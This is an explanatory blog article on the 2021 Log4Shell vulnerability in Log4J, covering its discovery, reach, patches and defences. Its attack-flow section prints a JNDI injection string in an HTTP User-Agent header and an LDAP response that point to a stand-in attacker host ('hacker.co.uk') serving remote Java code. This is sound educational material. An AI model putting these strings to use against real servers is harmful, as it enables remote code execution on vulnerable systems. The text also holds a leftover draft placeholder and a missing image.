---
title: Understanding the Cyber Pandemic - Log4Shell
tags: [Log4J, Log4Shell, Vulnerabilities]
style: fill
color: primary
description: How a single Java tool brought the internet and modern tech infrastructure to its knees
---

Source: [Numerous - see links in article]

The critical Log4J vulnerability dubbed “Log4shell” is an excellent example of how a single point of failure can completely change the cyber threat landscape and drastically increase cyber risk to organisations across the globe. Described by many as a “cyber pandemic”, it is one of the most significant security incidents in recent memory, with security firm Tenable describing it as "the single biggest, most critical vulnerability of the last decade".

## What is Log4J?  

Log4J is an open-source logging tool used in the Java programming language. Logging tools are used to record events that occur in operating systems or computer programs, such as bugs or errors. Logs are useful for numerous reasons, including debugging software and investigating potential cyber security incidents. 

## How was the Log4Shell vulnerability discovered?

Players of the popular game Minecraft discovered a vulnerability affecting the ‘[Minecraft Java Edition](https://www.minecraft.net/en-us/article/important-message--security-vulnerability-java-edition)’ version of the game. The vulnerability would allow attackers to exploit and crash the computer of the player hosting the game server. 

At first, it was believed that the vulnerability was isolated to Minecraft. It is still not known who first discovered the vulnerability in the game or when it was discovered. There are videos on YouTube of Minecraft players exploiting the game before the severity of the vulnerability was realised.

[Chen Zhaojun of the Alibaba Cloud Security Team](https://www.lawfareblog.com/whats-deal-log4shell-security-nightmare) investigated and found the vulnerability was not in Minecraft’s code, but in Log4J’s and, on December 9th, 2021, tweeted his findings and released sample code of how to exploit the vulnerability. Following the initial release of the vulnerability that Zhaojun named “Log4Shell”, several other Log4J vulnerabilities were discovered. 

### What is a security vulnerability and an exploit?

As per the UK’s National Cyber Security Center [(NCSC)’s guidance](https://www.ncsc.gov.uk/information/understanding-vulnerabilities):
“A vulnerability is a weakness in an IT system that can be exploited by an attacker to deliver a successful attack. They can occur through flaws, features or user error, and attackers will look to exploit any of them, often combining one or more, to achieve their end goal.”
In a nutshell:
  •	A “vulnerability” is a weakness in a computer system
  •	An “exploit” is a means of misusing a vulnerability (weakness) to achieve further goals, such as gaining control of the vulnerable computer system
Log4Shell is a specific type of vulnerability known as a “zero-day”. Zero-day vulnerabilities are notable because they are discovered by researchers or hackers before the vendor or developer themselves. This results in the vendor or developer having “zero-days” to fix the vulnerability. 

Zero-day vulnerabilities are generally higher risk as there is an increased chance of exploitation due to software patches not yet being released.

## Why is the Log4J vulnerability such big news?

There are many reasons why the Log4J vulnerability is significant:

### Log4J is ubiquitous in Java Applications

Log4J is the most [widely used logging tool on the internet](https://www.dynatrace.com/news/blog/what-is-log4shell/). Being open source, it is easier, cheaper, and quicker for developers to use a tool like Log4J to manage logging than it is for them to create their own logging tool from scratch. 

Security vendor [Sonatype reports](https://blog.sonatype.com/why-did-log4shell-set-the-internet-on-fire) that in the four months leading up to Log4Shell’s discovery, Log4J was downloaded 28.6 million times. [Data released by Contrast Security](https://www.contrastsecurity.com/security-influencers/log4shell-by-the-numbers) shows 90% of Java applications used a version of Log4J, with 58% of those being vulnerable to the Log4Shell vulnerability at the time of discovery. 

Data on different logging tool usage can get confusing as most applications use multiple logging tools. Applications can often have multiple versions of multiple types of logging tools. This also makes detecting and patching Log4Shell incredibly difficult.

### Java is very popular, despite its age

Java is a widely used programming language. It has been consistently popular since its release in 1995 and is used in a [number of use cases](https://www.frgconsulting.com/blog/why-is-java-so-popular-developers/), including web applications, software tools, and scientific applications. The Android operating system make use of Java and Google’s Gmail is built using the programming language.

### Java (and Log4J) is used by large enterprises and critical infrastructure

The significance of vulnerabilities often come down to the question “who uses the affected software/operating systems/hardware”.

Security firm CheckPoint released statistics on the impact of Log4J. Their data showed nearly 50% of all corporate networks and 53% of banking and finance enterprises worldwide used applications vulnerable to Log4Shell:

{% include elements/figure.html image="./assets/log4shell-impactindustry.png" caption="Credit [Checkpoint.com](www.checkpoint.com)." %}
{% include elements/figure.html image="./assets/log4shell-impactregion.png" caption="Credit [Checkpoint.com](www.checkpoint.com)." %}

### Java (and log4J) is used everywhere

Anyone who has ever installed Java on a computer or server, will have seen the owner of Java, Oracle, gloat that “3 billion devices run on Java”. Ironically, the Cybersecurity and Infrastructure Security Agency (CISA) [predicts upwards of 3 billion devices](https://www.medtechdive.com/news/fda-warns-log4j-cybersecurity-risks-medical-devices/611773/#:~:text=Log4j%2C%20which%20is%20used%20to,medical%20devices%20and%20supporting%20systems.) are vulnerable to Log4Shell worldwide.

ADD 3 BILLION DEVICES IMAGE

An almost unbelievable range of products, devices, software and hardware are vulnerable to exploitation from Log4Shell, from [medical devices](https://www.medtechdive.com/news/fda-warns-log4j-cybersecurity-risks-medical-devices/611773/#:~:text=Log4j%2C%20which%20is%20used%20to,medical%20devices%20and%20supporting%20systems) such as CT scanners and blood storage fridges, to [military systems](https://cisomag.eccouncil.org/hackers-exploit-log4j-bug-to-attack-belgium-defense-ministry/), [iPhones and Tesla vehicles](https://www.techradar.com/uk/news/log4shell-can-hack-your-iphone-and-even-a-tesla). 

Affected vendors include [Amazon Web Services](https://www.crn.com.au/news/10-vendors-affected-by-the-log4j-vulnerability-573994), BroadCom, Cisco, Fortinet, CloudFlare, Apple, Google, IBM, VMWare, [Rapid7](https://www.zdnet.com/article/log4j-flaw-puts-hundreds-of-millions-of-devices-at-risk-says-us-cybersecurity-agency/), [Oracle](https://www.zdnet.com/article/log4j-flaw-puts-hundreds-of-millions-of-devices-at-risk-says-us-cybersecurity-agency/), RedHat, Splunk and Microsoft Azure. 

The [NCSC has compiled a list of software](https://github.com/NCSC-NL/log4shell/tree/main/software) affected by the various Log4J vulnerabilities.

### Log4Shell is very, very easy to exploit

All it takes to exploit Log4Shell on a system or server is a single string of text. Once that string is injected into a vulnerable system, that system could then be completely taken over by the attacker. There are multiple ways to push the string to any one system.

## How does the Log4Shell exploit work?

Fundamentally, attackers use a very old weakness in computer software to exploit Log4Shell. The weakness is called “[improper input validation](https://www.martellosecurity.com/kb/mitre/cwe/20/)”. This means that the developers have placed too much trust in data that is ingested by an application from an outside source. Without proper cleaning and validation, data inputted by users can be used to exploit a number of common vulnerabilities, including [buffer overflow](https://www.imperva.com/learn/application-security/buffer-overflow/) and [SQL injection](https://www.imperva.com/learn/application-security/buffer-overflow/) attacks.

In the case of Log4Shell, attackers use a feature of Java called the “Java Naming and Directory Interface” (JNDI). JNDI is an API that allows Java applications to look up data and resources from other external resources. This could be a database, a configuration file, or a direction service such as LDAP. Effectively, the application is reaching out and pulling back data from another, external source. 

The string of code used to invoke JNDI is the aforementioned malicious single string of text. As previously stated, there are many ways to push the malicious JNDI code string to servers vulnerable to Log4Shell. The most common method can be simplified into five stages:

{% include elements/figure.html image="./assets/log4shellattackflow.png" caption="Attack Flow." %}

Stage 1 – The attacker inserts the JNDI lookup in a website header field that is likely to be logged:
```python
GET /test HTTP/1.1
Host: victim.com
User-agent: ${jndi:ldap://hacker.co.uk/x}
```

Step 2 – The malicious JNDI string is passed to the vulnerable Log4J instance and logged:
```python
${jndi:ldap://hacker.co.uk/x}
```

Step 3 – Log4J interprets the string that it just logged as an actual command and reaches out to the malicious LDAP server with a query:
```python
ldap://hacker.co.uk/x
```

Step 4 – The malicious LDAP server responds with malicious Java code:
```python
dn :
javaClassName: Malicious
javaCodeBase: https://hacker.co.uk/evilcode
javaSerializedData: <…>
```

Step 5 – The vulnerable server then downloads the malicious Java code and executes it:
```python
public class Malicious implements Serialize {
	…
	static {
		<malicious Java code>
	}
}
```

At this point, it is up to the attackers what happens next. So far the vulnerability has been used by [nation-state actors](https://www.bleepingcomputer.com/news/security/log4j-vulnerability-now-used-by-state-backed-hackers-access-brokers/) and [ransomware gangs](https://www.bleepingcomputer.com/news/security/hackers-start-pushing-malware-in-worldwide-log4shell-attacks/) to setup crypto miners, and botnets.

## How can we defend against Log4Shell?

There are several means of defending against Log4Shell. Refer to the attack flow below:

{% include elements/figure.html image="./assets/log4shelldefenseflow.png" caption="Defense Flow" %}

At stage 1 – To prevent against the insertion of the JNDI lookup in the header field, Web Application Firewalls rules can be setup to prevent succession posting of the web header. However, attackers have quickly developed means to [get around this defence](https://github.com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words).

At stage 2 – Perhaps the most obvious step is to disable Log4J and remove the threat of Log4Shell. This is only a temporary fix, as a logging tool will still be required eventually.

At stage 3 – Disabling JNDI if the application doesn’t require the feature, is a possible short-term fix.

At stage 5 – Disabling remote codebases is also a decent short-term fix. This would result in JNDI lookups only being available within the applications specific network and prohibit lookups across the internet.

Patching Log4J – to the most recent version is the best means of remediating this vulnerability. During an incident like Log4Shell, additional vulnerabilities are often found in the offending software.

As per [Dynatrace](https://www.dynatrace.com/news/blog/what-is-log4shell/): “[Apache issued a patch](https://logging.apache.org/log4j/2.x/security.html#cve-2021-44228) for CVE-2021-44228, version 2.15, on December 6, 2021. However, this patch left part of the vulnerability unfixed, resulting in [CVE-2021-45046](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45046) and a second patch, version 2.16, released on December 13. Apache released a third patch, version 2.17, on December 17 to fix another related vulnerability, [CVE-2021-45105](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45105). They released a fourth patch, 2.17.1, on December 28 to address another vulnerability, [CVE-2021-44832](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44832).”

## Why did the discovery of Log4Shell result in other vulnerabilities being found in Log4J?

As previous stated, significant vulnerabilities tend be found in software or operating systems that are popular and in widespread use. When explaining this to people, I refer to it as the “eyes on” principle. 

The more eyes that are on a piece of software, the more vulnerabilities will be found. Once Log4Shell was discovered, the number of eyes on Log4J would have increased drastically and more vulnerabilities were found as a result.

## What can be done to prevent this happening again?

### Use of SBOMs

A Software Bill of Materials (SBOM) is a list of dependencies, tools, and libraries (both proprietary and open source) used within an application. Keeping an SBOM up to date can drastically decrease the amount of time and effort it takes to discover elements of an application that needs to be patched.

### Stop the use of single points of failure

Log4Shell was a noteworthy vulnerability purely because of its widespread use. Building infrastructure on open-source code like Log4Shell is essential in producing software quickly but leads to issues when vulnerabilities arise. The usage of numerous and varied open-source tools to fix a problem reduces the risk of using a single tool. The cartoon below demonstrates this well:

## Summary and final thoughts
It is important to remember that open-source software is often created and maintained by passionate members of the IT community, usually with little praise or financial incentive and little to no funding.

Log4J is integral to applications built by some of the world’s most profitable organisations and nations, yet it was maintained by three developers working for free (at the time of Log4Shell’s discovery).

{% include elements/figure.html image="./assets/log4shelltwitter.png" caption="Source: Twitter.com" %}

Open-source software is third party risk, but organisations do not often see it as such. Tools like Log4J are taken for granted and funding for these projects is often non-existent. 

This is a big issue for the Tech industry as a whole and something that needs to be addressed to prevent future Log4Shell-esque vulnerabilities.

Log4Shell will not be the last vulnerability to have global ramifications. It will take a long time for us to realise the full extent of the damage caused by the vulnerability, as network and data breaches can go undiscovered for years. 

Until organisations and nations start to treat tools like Log4J for what they are – third party software that underpins business critical applications and national infrastructure – the true risk of using (and underfunding) such software will not be realised, until it is already too late.
